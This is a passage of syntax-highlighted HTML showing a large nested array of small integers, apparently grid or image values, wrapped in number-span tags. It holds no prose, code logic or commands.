class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">15</span>], [<span class="number">16</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">16</span>], [<span class="number">17</span>, <span class="number">16</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">16</span>], [<span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">19</span>, <span class="number">18</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>], [<span class="number">19</span>, <span class="number">19</span>, <span class="number">19</span>, <span class="number">19</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>], [<span class="number">19</span>, <span class="number">19</span>, <span class="number">19</span>, <span class="number">19</span>, <span class="number">19</span>, <span class="number">16</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">17</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">18</span>], [<span class="number">19</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">16</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">18</span>, <span class="number">20</span>, <span class="number">18</span>, <span class="number">17</span>, <span class="number">20</span>], [<span class="number">19</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">19</span>, <span class="number">17</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">18</span>], [<span class="number">19</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">19</span>, <span class="number">19</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">21</span>], [<span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">19</span>, <span class="number">18</span>, <span class="number">12</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">18</span>, <span class="number">21</span>, <span class="number">20</span>, <span class="number">21</span>], [<span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">20</span>], [<span class="number">9</span>, <span class="number">12</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">16</span>, <span class="number">21</span>, <span class="number">21</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">18</span>, <span class="number">21</span>], [<span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">17</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">20</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">19</span>], [<span class="number">11</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">20</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">20</span>], [<span class="number">17</span>, <span class="number">18</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">19</span>, <span class="number">18</span>, <span class="number">12</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">20</span>, <span class="number">21</span>], [<span class="number">19</span>, <span class="number">18</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">19</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">20</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">20</span>], [<span class="number">19</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">19</span>, <span class="number">18</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">21</span>, <span class="number">21</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">22</span>, <span class="number">21</span>], [<span class="number">20</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">19</span>, <span class="number">19</span>, <span class="number">18</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">21</span>, <span class="number">21</span>, <span class="number">21</span>, <span class="number">21</span>, <span class="number">21</span>, <span class="number">19</span>, <span class="number">22</span>, <span class="number">22</span>, <span class="number">22</span>], [<span class="number">20</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">19</span>, <span class="number">19</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">22</span>, <span class="number">22</span>, <span class="number">22</span>, <span class="number">22</span>, <span class="number">21</span>, <span class="number">20</span>, <span class="number">22</span>, <span class="number">22</span>, <span class="number">22</span>], [<span class="number">19</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">18</span>, <span class="number">13</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">18</span>, <span class="number">22</span>, <span class="number">22</span>, <span class="number">22</span>, <span class="number">21</span>, <span class="number">21</span>, <span class="number">21</span>, <span class="number">20</span>, <span class="number">22</span>, <span class="number">22</span>], [<span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">23</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">23</span>, <span class="number">21</span>, <span class="number">20</span>, <span class="number">22</span>, <span class="number">22</span>], [<span class="number">13</span>, <span class="number">12</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">21</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">21</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">21</span>], [<span class="number">13</span>, <span class="number">12</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">1</span>, <span 